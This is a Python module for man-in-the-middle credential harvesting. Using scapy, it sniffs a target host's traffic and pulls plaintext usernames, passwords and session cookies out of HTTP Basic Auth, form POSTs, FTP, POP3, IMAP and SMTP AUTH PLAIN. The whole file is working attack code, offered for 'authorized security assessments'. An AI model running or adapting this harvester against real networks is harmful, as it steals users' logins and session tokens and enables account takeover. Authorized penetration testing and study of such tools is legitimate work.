"""Credential harvesting module for MITM traffic interception.

Extracts plaintext credentials from intercepted network traffic during
a man-in-the-middle attack. Used for authorized security assessments only.

Supported protocols:
- HTTP Basic Auth (Authorization: Basic header)
- HTTP form POST (username/password fields)
- FTP USER/PASS
- SMTP AUTH (base64)
- POP3 USER/PASS
- IMAP LOGIN
- HTTP cookies (session tokens)
"""

import base64
import re
import threading
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional
from urllib.parse import unquote_plus

from scapy.all import sniff, IP, TCP, Raw, conf


@dataclass
class HarvestedCredential:
    """A captured credential."""

    timestamp: str
    protocol: str
    src_ip: str
    dst_ip: str
    dst_port: int
    username: str = ""
    password: str = ""
    raw_data: str = ""
    url: str = ""


class CredentialHarvester:
    """Captures credentials from intercepted traffic during MITM.

    Args:
        target_ip: Only capture traffic from this IP.
        interface: Network interface to sniff on.
    """

    def __init__(self, target_ip: str, interface: Optional[str] = None):
        self.target_ip = target_ip
        self.interface = interface or conf.iface
        self.credentials: list[HarvestedCredential] = []
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()

        # FTP/POP3 state tracking: src_ip:src_port -> username
        self._pending_users: dict[str, str] = {}

    @property
    def count(self) -> int:
        return len(self.credentials)

    def start(self) -> None:
        """Start harvesting credentials in a background thread."""
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._sniff, daemon=True)
        self._thread.start()

    def stop(self) -> list[HarvestedCredential]:
        """Stop harvesting and return all captured credentials."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        return self.credentials

    def _sniff(self) -> None:
        sniff(
            iface=self.interface,
            prn=self._handle_packet,
            store=False,
            stop_filter=lambda _: not self._running,
        )

    def _add_cred(self, cred: HarvestedCredential) -> None:
        with self._lock:
            self.credentials.append(cred)

    def _handle_packet(self, pkt) -> None:
        if not pkt.haslayer(IP) or not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        ip = pkt[IP]
        if ip.src != self.target_ip and ip.dst != self.target_ip:
            return

        tcp = pkt[TCP]
        payload = bytes(pkt[Raw].load)
        timestamp = datetime.now().isoformat()
        session_key = f"{ip.src}:{tcp.sport}"

        # --- HTTP ---
        if tcp.dport in (80, 8080, 8000, 8888) or payload.startswith((b"GET ", b"POST ", b"PUT ")):
            self._parse_http(payload, ip.src, ip.dst, tcp.dport, timestamp)
            return

        # --- FTP (port 21) ---
        if tcp.dport == 21:
            self._parse_ftp(payload, ip.src, ip.dst, tcp.dport, timestamp, session_key)
            return

        # --- POP3 (port 110) ---
        if tcp.dport == 110:
            self._parse_pop3(payload, ip.src, ip.dst, tcp.dport, timestamp, session_key)
            return

        # --- IMAP (port 143) ---
        if tcp.dport == 143:
            self._parse_imap(payload, ip.src, ip.dst, tcp.dport, timestamp)
            return

        # --- SMTP (port 25, 587) ---
        if tcp.dport in (25, 587):
            self._parse_smtp(payload, ip.src, ip.dst, tcp.dport, timestamp)
            return

    def _parse_http(self, payload: bytes, src: str, dst: str, port: int, ts: str) -> None:
        """Parse HTTP traffic for credentials."""
        try:
            text = payload.decode("utf-8", errors="ignore")
        except Exception:
            return

        # Extract host and path
        url = ""
        host_match = re.search(r"Host:\s*(.+?)[\r\n]", text)
        path_match = re.match(r"(?:GET|POST|PUT)\s+(\S+)", text)
        if host_match and path_match:
            url = f"http://{host_match.group(1).strip()}{path_match.group(1)}"

        # HTTP Basic Auth
        auth_match = re.search(r"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", text)
        if auth_match:
            try:
                decoded = base64.b64decode(auth_match.group(1)).decode("utf-8", errors="ignore")
                if ":" in decoded:
                    user, passwd = decoded.split(":", 1)
                    self._add_cred(HarvestedCredential(
                        timestamp=ts, protocol="HTTP Basic Auth",
                        src_ip=src, dst_ip=dst, dst_port=port,
                        username=user, password=passwd, url=url,
                        raw_data=f"Authorization: Basic {auth_match.group(1)}",
                    ))
            except Exception:
                pass

        # HTTP form POST body
        if text.startswith("POST "):
            # Find body after double CRLF
            parts = text.split("\r\n\r\n", 1)
            if len(parts) == 2:
                body = parts[1]
                # URL-encoded form data
                user = self._extract_form_field(body, ["username", "user", "login", "email", "usr", "uname"])
                passwd = self._extract_form_field(body, ["password", "passwd", "pass", "pwd", "secret"])
                if user or passwd:
                    self._add_cred(HarvestedCredential(
                        timestamp=ts, protocol="HTTP Form POST",
                        src_ip=src, dst_ip=dst, dst_port=port,
                        username=user, password=passwd, url=url,
                        raw_data=body[:500],
                    ))

        # Cookies
        cookie_match = re.search(r"Cookie:\s*(.+?)[\r\n]", text)
        if cookie_match:
            cookies = cookie_match.group(1).strip()
            # Only capture if it looks like a session cookie
            session_patterns = ["session", "token", "auth", "sid", "jwt", "PHPSESSID", "JSESSIONID"]
            if any(p.lower() in cookies.lower() for p in session_patterns):
                self._add_cred(HarvestedCredential(
                    timestamp=ts, protocol="HTTP Cookie",
                    src_ip=src, dst_ip=dst, dst_port=port,
                    username="(session)", password=cookies[:200], url=url,
                    raw_data=cookies[:500],
                ))

    def _extract_form_field(self, body: str, field_names: list[str]) -> str:
        """Extract a field value from URL-encoded form data."""
        for name in field_names:
            pattern = rf"(?:^|&){re.escape(name)}=([^&]*)"
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                return unquote_plus(match.group(1))
        return ""

    def _parse_ftp(self, payload: bytes, src: str, dst: str, port: int, ts: str, key: str) -> None:
        """Parse FTP USER/PASS commands."""
        text = payload.decode("ascii", errors="ignore").strip()
        if text.upper().startswith("USER "):
            self._pending_users[key] = text[5:].strip()
        elif text.upper().startswith("PASS "):
            user = self._pending_users.pop(key, "")
            self._add_cred(HarvestedCredential(
                timestamp=ts, protocol="FTP",
                src_ip=src, dst_ip=dst, dst_port=port,
                username=user, password=text[5:].strip(),
                raw_data=f"USER {user} / PASS {text[5:].strip()}",
            ))

    def _parse_pop3(self, payload: bytes, src: str, dst: str, port: int, ts: str, key: str) -> None:
        """Parse POP3 USER/PASS commands."""
        text = payload.decode("ascii", errors="ignore").strip()
        if text.upper().startswith("USER "):
            self._pending_users[key] = text[5:].strip()
        elif text.upper().startswith("PASS "):
            user = self._pending_users.pop(key, "")
            self._add_cred(HarvestedCredential(
                timestamp=ts, protocol="POP3",
                src_ip=src, dst_ip=dst, dst_port=port,
                username=user, password=text[5:].strip(),
                raw_data=f"USER {user} / PASS {text[5:].strip()}",
            ))

    def _parse_imap(self, payload: bytes, src: str, dst: str, port: int, ts: str) -> None:
        """Parse IMAP LOGIN commands."""
        text = payload.decode("ascii", errors="ignore").strip()
        # IMAP LOGIN format: tag LOGIN username password
        match = re.search(r"LOGIN\s+\"?([^\s\"]+)\"?\s+\"?([^\s\"]+)\"?", text, re.IGNORECASE)
        if match:
            self._add_cred(HarvestedCredential(
                timestamp=ts, protocol="IMAP",
                src_ip=src, dst_ip=dst, dst_port=port,
                username=match.group(1), password=match.group(2),
                raw_data=text[:200],
            ))

    def _parse_smtp(self, payload: bytes, src: str, dst: str, port: int, ts: str) -> None:
        """Parse SMTP AUTH (base64 encoded)."""
        text = payload.decode("ascii", errors="ignore").strip()
        # AUTH LOGIN sends base64 username then password on separate lines
        # AUTH PLAIN sends base64(\0user\0pass)
        if "AUTH PLAIN" in text.upper():
            parts = text.split()
            for part in parts[2:]:
                try:
                    decoded = base64.b64decode(part).decode("utf-8", errors="ignore")
                    # Format: \0username\0password
                    fields = decoded.split("\0")
                    if len(fields) >= 3:
                        self._add_cred(HarvestedCredential(
                            timestamp=ts, protocol="SMTP",
                            src_ip=src, dst_ip=dst, dst_port=port,
                            username=fields[1], password=fields[2],
                            raw_data=text[:200],
                        ))
                except Exception:
                    pass
